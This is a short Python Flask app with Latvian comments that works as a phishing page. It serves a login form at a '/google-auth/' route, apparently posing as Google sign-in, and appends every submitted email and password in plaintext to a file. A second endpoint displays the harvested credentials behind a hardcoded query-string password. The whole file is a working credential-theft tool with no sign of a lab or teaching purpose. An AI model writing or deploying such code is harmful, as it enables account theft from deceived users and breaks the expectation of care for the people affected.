from flask import Flask, render_template, request, redirect, url_for, abort

app = Flask(__name__)

# Šis ir tavs login forms
@app.route('/google-auth/', methods=['GET'])
def show_form():
    return render_template('google-auth.html')

@app.route('/google-auth/', methods=['POST'])
def handle_form():
    email = request.form['email']
    password = request.form['password']

    with open("credentials.txt", "a", encoding="utf-8") as file:
        file.write(f"{email} | {password}\n")

    return redirect(url_for('show_form'))

# Šis endpoint rāda saglabātos datus. Aizsargāsim to ar vienkāršu paroli
@app.route('/show-credentials/')
def show_credentials():
    auth = request.args.get('auth')
    if auth != 'Robertins1':
        abort(403)  # Aizliegts piekļūt, ja parole nav pareiza

    try:
        with open("credentials.txt", "r", encoding="utf-8") as file:
            data = file.read()
    except FileNotFoundError:
        data = "Nav saglabātu datu."

    # Parāda datus vienkāršā lapā
    return f"<pre>{data}</pre>"
